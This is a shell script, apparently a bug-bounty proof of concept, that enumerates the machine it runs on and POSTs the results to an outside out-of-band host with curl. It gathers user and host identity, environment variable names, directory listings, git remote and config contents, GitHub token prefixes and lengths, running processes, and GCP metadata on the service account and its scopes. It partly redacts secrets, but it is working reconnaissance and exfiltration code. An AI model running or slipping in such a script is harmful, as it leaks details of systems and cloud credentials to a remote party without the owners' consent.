#!/bin/sh
# benign read-only enumeration for a security PoC
OOB=https://cfg-recon.oob2.bountyexplained.com
D=$(mktemp -d 2>/dev/null || echo /tmp)
{
  echo "== whoami =="; id 2>&1; hostname 2>&1; pwd 2>&1; uname -a 2>&1
  echo "== env NAMES only (values redacted) =="; env 2>&1 | sed 's/=.*/=<redacted>/' | sort | tr '\n' ' '
  echo; echo "== cwd =="; ls -la . 2>&1 | head -40
  echo "== / =="; ls -la / 2>&1 | head -40
} > "$D/a.txt" 2>&1
curl -s -m 15 -X POST --data-binary "@$D/a.txt" "$OOB/r1" >/dev/null 2>&1
{
  echo "== git remote (secret redacted) =="
  git -C . remote -v 2>&1 | sed -E 's#(://[^:]*:)[^@]{6}[^@]*@#\1<REDACTED_len_unknown>@#'
  echo "== .git/config =="
  sed -E 's#(://[^:]*:)[^@]{6}[^@]*@#\1<REDACTED>@#' .git/config 2>&1 | head -30
  echo "== token-shaped strings present? (prefix+len only) =="
  env 2>&1 | grep -oE '(gh[pousr]_[A-Za-z0-9]+|ghs_[A-Za-z0-9]+)' | while read t; do echo "TOKEN prefix=$(echo "$t" | cut -c1-4) len=${#t}"; done
  echo "== processes =="; ps aux 2>&1 | head -25
} > "$D/b.txt" 2>&1
curl -s -m 15 -X POST --data-binary "@$D/b.txt" "$OOB/r2" >/dev/null 2>&1
{
  echo "== GCP metadata (non-secret fields only) =="
  echo "project-id: $(curl -s -m 6 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/project/project-id 2>&1)"
  echo "sa-email: $(curl -s -m 6 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/email 2>&1)"
  echo "sa-scopes: $(curl -s -m 6 -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/scopes 2>&1 | tr '\n' ',')"
  echo "token-endpoint-status: $(curl -s -m 6 -o /dev/null -w '%{http_code}' -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token 2>&1)"
  echo "== egress test =="
  echo "google204: $(curl -s -m 6 -o /dev/null -w '%{http_code}' https://www.google.com/generate_204 2>&1)"
  echo "github-api: $(curl -s -m 6 -o /dev/null -w '%{http_code}' https://api.github.com/ 2>&1)"
} > "$D/c.txt" 2>&1
curl -s -m 15 -X POST --data-binary "@$D/c.txt" "$OOB/r3" >/dev/null 2>&1
